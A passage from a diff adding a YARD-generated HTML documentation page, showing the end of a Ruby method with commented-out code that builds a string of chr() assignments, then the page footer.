+</span>  <span class='comment'>#	alpha_used.each_key { |k| buf = &quot;$#{k.chr}=chr(#{k});&quot; + buf }
+</span>  <span class='comment'>#end
+</span>  <span class='comment'>#
+</span>  <span class='comment'>#buf.gsub!(/\s*/, &#39;&#39;)
+</span>  <span class='comment'>#
+</span>  <span class='comment'>###
+</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_buf'>buf</span>
+
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:30:14 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
